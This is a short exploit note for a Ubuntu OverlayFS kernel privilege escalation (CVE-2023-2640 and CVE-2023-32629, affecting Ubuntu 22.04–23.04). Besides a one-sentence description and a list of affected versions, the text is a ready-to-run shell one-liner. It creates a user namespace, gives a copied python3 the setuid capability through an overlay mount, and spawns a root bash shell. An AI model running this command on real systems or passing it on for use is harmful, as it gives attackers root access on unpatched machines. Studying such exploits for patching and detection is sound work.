Linux kernel privilege escalation vulnerability, native to ubuntu allow for attackers to use the benefits of OverlayFS to make files with special capabilities to gain root.

Vulnerable versions : Ubuntu 22.04, 22.10, 23.04
CVE-2023-2640 && CVE-2023-32629


```
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/; setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("/bin/bash")'
```